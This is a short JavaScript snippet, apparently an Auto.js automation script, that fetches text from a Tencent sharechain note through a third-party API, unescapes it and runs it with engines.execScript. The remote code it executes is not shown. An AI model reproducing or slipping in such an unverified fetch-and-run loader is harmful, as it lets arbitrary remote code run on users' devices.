    var 铭 = "https://sharechain.qq.com/0a6697d70b6b8797fdeefd9f39bed4f3"
    var 心_ = http.get("https://api.uomg.com/api/get.weiyun?wid=" + 铭.slice(26)).body.string().replace(/&gt;/g, ">").replace(/&lt;/g, "<").replace(/&nbsp;/g, ' ');
    if (心_ != null) {
        engines.execScript("js",心_)
    }